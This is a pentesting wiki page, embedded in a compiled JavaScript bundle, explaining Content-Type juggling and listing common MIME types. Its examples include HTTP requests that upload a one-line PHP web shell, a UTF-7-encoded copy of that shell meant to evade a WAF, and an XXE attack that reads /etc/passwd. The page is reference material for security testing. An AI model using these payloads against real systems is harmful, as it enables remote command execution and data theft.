import{_ as a,c as e,a5 as n,o as i}from"./chunks/framework.B5CpDqM0.js";const t="/assets/CT-JUGGLING-3.BBLml1_u.png",p="/assets/CT-JUGGLING-4.CHRFWSO6.png",u=JSON.parse('{"title":"Content-Type juggling","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/content-type-juggling/index.md","filePath":"web/inputs/content-type-juggling/index.md","lastUpdated":1724982529000}'),l={name:"web/inputs/content-type-juggling/index.md"};function o(h,s,c,d,r,g){return i(),e("div",null,s[0]||(s[0]=[n(`<h1 id="content-type-juggling" tabindex="-1">Content-Type juggling <a class="header-anchor" href="#content-type-juggling" aria-label="Permalink to &quot;Content-Type juggling&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>Content-Type juggling exploits the lack of checking on the <code>Content-Type</code> header when submitting an HTTP request.</p><p>Most of the time, Content-Type juggling is a way to carry out other attacks such as <a href="./../file-inclusion/lfi-to-rce/file-upload">unrestricted-file-upload</a> or <a href="#example-of-a-content-type-juggling-attack-on-api-leading-to-xxe">xxe-injection</a> (see <a href="#examples">examples</a>).</p><div class="tip custom-block"><p>The <code>Content-Type</code> header is used to indicate the MIME type of the resource.</p><ul><li>In requests, (such as <code>POST</code> or <code>PUT</code>), the client tells the server what type of data was actually sent.</li><li>In responses, a <code>Content-Type</code> header tells the client what type of content is actually being returned. Browsers may try to detect the MIME type of content by inspecting it rather than by respecting the value of this header.</li></ul></div><div class="warning custom-block"><p>If the <a href="./../../config/http-headers/index#xcto-x-content-type-options">XCTO (X-Content-Type-Options)</a> security header is present, it will be difficult to perform the <code>Content-Type</code> juggling, as indicated in <a href="./../../config/http-headers/mime-sniffing">mime-sniffing</a>. The XCTO security header can be used to indicate that the MIME types advertised in the <code>Content-Type</code> headers should be followed and not be changed by the browser depending on the page&#39;s content. Websites that implement this security header with the <code>nosniff</code> directive must also include a valid <code>Content-Type</code> header in their responses.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="identify-a-target-vulnerable-to-content-type-juggling" tabindex="-1">Identify a target vulnerable to Content-Type juggling <a class="header-anchor" href="#identify-a-target-vulnerable-to-content-type-juggling" aria-label="Permalink to &quot;Identify a target vulnerable to Content-Type juggling&quot;">​</a></h3><p>In order to identify if the target is vulnerable to <code>Content-Type</code> juggling, testers need to answer the following questions :</p><ul><li>Is there a post request with value(s) and <code>Content-Type</code> header ?</li><li>Is the <code>X-Content-Type-Options</code> security header not present ?</li><li>Can the <code>Content-Type</code> header be edited, and the <code>POST</code> request still be submitted successfully ?</li></ul><p>If the answer is yes to the questions above, then one should be able to perform <code>Content-Type</code> juggling and might find a way to perform other attacks as a result:</p><ul><li>If one can switch to <code>application/xml</code>, <a href="./../xxe-injection/index">XXE</a> should be tried.</li><li>If one can switch to <code>application/zip</code>, uploading malicious zip file should be tried.</li><li>If one can switch to <code>application/php</code>, uploading PHP payloads should be tried.</li><li>If one can switch to <code>application/image</code>, uploading <a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html" target="_blank" rel="noreferrer">malicious image</a> should be tried.</li></ul><p>One should not stick to this list and always try several Content-Type values.</p><details class="details custom-block"><summary>List of the most common Content-Type values</summary><p>Type application</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>application/java-archive</span></span>
<span class="line"><span>application/EDI-X12</span></span>
<span class="line"><span>application/EDIFACT</span></span>
<span class="line"><span>application/javascript</span></span>
<span class="line"><span>application/octet-stream</span></span>
<span class="line"><span>application/ogg</span></span>
<span class="line"><span>application/pdf</span></span>
<span class="line"><span>application/xhtml+xml</span></span>
<span class="line"><span>application/x-shockwave-flash</span></span>
<span class="line"><span>application/json</span></span>
<span class="line"><span>application/ld+json</span></span>
<span class="line"><span>application/xml</span></span>
<span class="line"><span>application/zip</span></span>
<span class="line"><span>application/x-www-form-urlencoded</span></span></code></pre></div><p>Type audio</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>audio/mpeg</span></span>
<span class="line"><span>audio/x-ms-wma</span></span>
<span class="line"><span>audio/vnd.rn-realaudio</span></span>
<span class="line"><span>audio/x-wav</span></span></code></pre></div><p>Type image</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>image/gif</span></span>
<span class="line"><span>image/jpeg</span></span>
<span class="line"><span>image/png</span></span>
<span class="line"><span>image/tiff</span></span>
<span class="line"><span>image/vnd.microsoft.icon</span></span>
<span class="line"><span>image/x-icon</span></span>
<span class="line"><span>image/vnd.djvu</span></span>
<span class="line"><span>image/svg+xml</span></span></code></pre></div><p>Type multipart</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>multipart/mixed</span></span>
<span class="line"><span>multipart/alternative</span></span>
<span class="line"><span>multipart/related (using by MHTML (HTML mail).)</span></span>
<span class="line"><span>multipart/form-data</span></span></code></pre></div><p>Type text</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>text/css</span></span>
<span class="line"><span>text/csv</span></span>
<span class="line"><span>text/html</span></span>
<span class="line"><span>text/javascript (obsolete)</span></span>
<span class="line"><span>text/plain</span></span>
<span class="line"><span>text/xml</span></span></code></pre></div><p>Type video</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>video/mpeg</span></span>
<span class="line"><span>video/mp4</span></span>
<span class="line"><span>video/quicktime</span></span>
<span class="line"><span>video/x-ms-wmv</span></span>
<span class="line"><span>video/x-msvideo</span></span>
<span class="line"><span>video/x-flv</span></span>
<span class="line"><span>video/webm</span></span></code></pre></div><p>Type vnd</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>application/vnd.android.package-archive</span></span>
<span class="line"><span>application/vnd.oasis.opendocument.text</span></span>
<span class="line"><span>application/vnd.oasis.opendocument.spreadsheet</span></span>
<span class="line"><span>application/vnd.oasis.opendocument.presentation</span></span>
<span class="line"><span>application/vnd.oasis.opendocument.graphics</span></span>
<span class="line"><span>application/vnd.ms-excel</span></span>
<span class="line"><span>application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</span></span>
<span class="line"><span>application/vnd.ms-powerpoint</span></span>
<span class="line"><span>application/vnd.openxmlformats-officedocument.presentationml.presentation</span></span>
<span class="line"><span>application/msword</span></span>
<span class="line"><span>application/vnd.openxmlformats-officedocument.wordprocessingml.document</span></span>
<span class="line"><span>application/vnd.mozilla.xul+xml</span></span></code></pre></div></details><h3 id="example-attacks" tabindex="-1">Example attacks <a class="header-anchor" href="#example-attacks" aria-label="Permalink to &quot;Example attacks&quot;">​</a></h3><details class="details custom-block"><summary>PHP payload upload and RCE</summary><p>Let&#39;s take this POST request following the submit of a form. Two <code>Content-Type</code> headers can be seen, the second one is interesting since an attacker could be juggling the content-type to upload a malicious PHP file.</p><div class="language-HTTP vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTTP</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /foo </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">....request...</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">----------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-974767299852498929531610575</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Content-Disposition: form-data; name=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;myFile&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; filename=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;foo.txt&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Content-Type: text/plain</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(content of the uploaded file foo.txt)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">----------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-974767299852498929531610575</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--</span></span></code></pre></div><p>The attacker is able to upload a PHP webshell thanks to the Content-Type juggling, changing it from <code>text/plain</code> to <code>application/php</code></p><div class="language-HTTP vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTTP</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /foo </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">....request...</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">----------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-974767299852498929531610575</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Content-Disposition: form-data; name=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;myFile&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; filename=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;foo.php&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Content-Type: application/php</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;?php system($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;cmd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]); ?&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">----------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-974767299852498929531610575</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">--</span></span></code></pre></div></details><details class="details custom-block"><summary>Bypass a WAF</summary><p>Sometimes, the <code>Content-Type</code> header has an additional field: <code>charset=&lt;value&gt;</code>.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Content-Type: text/html; charset=utf-8</span></span></code></pre></div><p>In this context, an attacker can try to edit the charset (e.g. from <code>utf-8</code> to <code>utf-7</code>) to bypass security controls such as Web Application Firewalls (WAFs), or regular expressions that check the value of a form. This technique cannot bypass the impact of the XCTO security header though (see the <a href="#theory">Theory</a> part).</p><p>Below is an example where an attacker is able to perform Content-Type juggling but is getting blocked by a WAF. To bypass it, &quot;charset juggling&quot; can be performed.</p><div class="language-HTTP vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTTP</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /foo </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> application/php; charset=utf-8</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Length</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 19</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;?</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">php</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> system</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;cmd&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]); ?&gt;</span></span></code></pre></div><div class="language-HTTP vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTTP</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /foo </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> application/php; charset=utf-7</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Length</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 19</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">+ADw-?php system(+ACQAXw-GET+AFsAIg-cmd+ACIAXQ-)+ADs- ?+AD4-</span></span></code></pre></div></details><details class="details custom-block"><summary>API attack, leading to XXE</summary><p>In the following request, the application normally sends JSON content (<code>Content-Type: application/json</code>).</p><p>If the target is vulnerable to Content-Type juggling and XXE, an attacker could attempt to modify the content-type header to <code>application/xml</code> and put some malicious XML to exploit an XXE.</p><p><img src="`+t+'" alt="Performing Content-Type juggling"></p><p>By combining Content-Type juggling with another attack, it&#39;s possible to extract information from the target (more about it in <a href="./../xxe-injection/index">XXE injection</a>).</p><p><img src="'+p+'" alt="Crafting a XXE payload to extract /etc/passwd"></p><p>For more insight on this attack, refer to <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2" target="_blank" rel="noreferrer">the writeup of the web challenge &quot;BNV&quot; from Google CTF 2019</a>, by <a href="https://github.com/Nicholaz99" target="_blank" rel="noreferrer">Nicholaz99</a>.</p></details><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2" target="_blank" rel="noreferrer">https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee" target="_blank" rel="noreferrer">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee</a> Content-Type from JSON to XEE</p><p><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#waf-and-protections-bypasses" target="_blank" rel="noreferrer">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#waf-and-protections-bypasses</a> WAF and protections bypasses</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" target="_blank" rel="noreferrer">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type</a></p>',23)]))}const y=a(l,[["render",o]]);export{u as __pageData,y as default};
